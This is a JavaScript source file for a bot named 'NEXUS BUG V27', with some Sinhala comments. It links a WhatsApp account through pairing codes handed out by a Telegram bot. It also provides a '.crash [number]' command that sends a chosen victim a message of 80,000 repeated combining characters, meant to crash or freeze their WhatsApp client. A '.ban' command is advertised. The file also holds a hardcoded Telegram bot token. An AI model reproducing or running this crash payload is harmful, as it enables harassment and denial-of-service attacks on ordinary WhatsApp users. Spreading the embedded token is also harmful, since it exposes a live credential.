const { 
    default: makeWASocket, 
    useMultiFileAuthState, 
    delay, 
    makeCacheableSignalKeyStore,
    Browsers
} = require("@whiskeysockets/baileys");
const pino = require("pino");
const { Telegraf, Markup } = require('telegraf');

// --- [ CONFIGURATION ] ---
const TG_TOKEN = '8655630932:AAECvnRecMAmBX44Ms-Rsp0gUwWdkWn-L5o';
const bot = new Telegraf(TG_TOKEN);
const owner = "Sasiya ROOT";

let sock;

async function startNexus() {
    // ⚠️ වැදගත්: අනිවාර්යයෙන්ම අලුත්ම session එකක් පාවිච්චි කරනවා
    const { state, saveCreds } = await useMultiFileAuthState('nexus_session_v27');
    
    sock = makeWASocket({
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "silent" })),
        },
        printQRInTerminal: false,
        logger: pino({ level: "silent" }),
        // මේ බ්‍රව්සර් එක තමයි පවර්ෆුල්ම කෝඩ් එක එන්න
        browser: ["Ubuntu", "Chrome", "20.0.04"] 
    });

    sock.ev.on('creds.update', saveCreds);

    // --- [ TELEGRAM INTERFACE ] ---
    bot.start((ctx) => {
        ctx.reply(`🛰️ ϟ **𝐍𝐄𝐗𝐔𝐒 𝐔𝐋𝐓𝐈𝐌𝐀𝐓𝐄 𝐕𝟐𝟕** ϟ 🧬\n━━━━━━━━━━━━━━━━━━━━\nOperator: ${owner}\nStatus: ONLINE 🟢\n━━━━━━━━━━━━━━━━━━━━`, 
        Markup.inlineKeyboard([[Markup.button.callback('🔗 GET PAIRING CODE', 'get_code')]]));
    });

    bot.action('get_code', (ctx) => {
        ctx.reply("📱 **ENTER YOUR NUMBER (947xxxxxxxx):**");

        bot.on('text', async (numCtx) => {
            let num = numCtx.message.text.replace(/[^0-9]/g, '');
            if (num.length === 9) num = '94' + num;

            const waitMsg = await numCtx.reply("⏳ **CONNECTING TO WHATSAPP CORE...**\n(This might take 20-30 seconds)");

            try {
                // සර්වර් එකට ස්ටේබල් වෙන්න හොඳ වෙලාවක් දෙනවා
                await delay(15000); 
                
                // කෝඩ් එක ඉල්ලන තැන - වැරදුණොත් ආයෙත් ට්‍රයි කරනවා
                let code = await sock.requestPairingCode(num);
                
                await bot.telegram.editMessageText(numCtx.chat.id, waitMsg.message_id, null, 
                `🔐 **YOUR PAIRING CODE:** \n\n\`${code}\` \n\n━━━━━━━━━━━━━━━━━━━━\n*Link this in WhatsApp -> Linked Devices.*`, { parse_mode: 'Markdown' });
            } catch (err) {
                console.log("Error requesting code:", err);
                bot.telegram.editMessageText(numCtx.chat.id, waitMsg.message_id, null, "❌ **SERVER BUSY:** \nWait 10s and send the number again.");
            }
        });
    });

    // --- [ WHATSAPP BUG ENGINE ] ---
    sock.ev.on('messages.upsert', async (chatUpdate) => {
        const msg = chatUpdate.messages[0];
        if (!msg.message || msg.key.fromMe) return;
        const mText = (msg.message.conversation || msg.message.extendedTextMessage?.text || "").toLowerCase();
        const from = msg.key.remoteJid;

        if (mText === '.menu') {
            await sock.sendMessage(from, { text: `🛰️ **NEXUS BUG V27 ACTIVE**\n━━━━━━━━━━━━━━\n.crash [number]\n.ban [number]\n━━━━━━━━━━━━━━` });
        }

        if (mText.startsWith('.crash')) {
            const target = mText.split(" ")[1] + "@s.whatsapp.net";
            const payload = "ॣ".repeat(80000); 
            await sock.sendMessage(target, { text: payload });
            await sock.sendMessage(from, { text: "✅ **INJECTED!**" });
        }
    });

    bot.launch();
}

// දුවන අතරේ අවුල් ආවොත් ආයෙත් restart වෙනවා
startNexus().catch(err => console.log("System Restarting...", err));
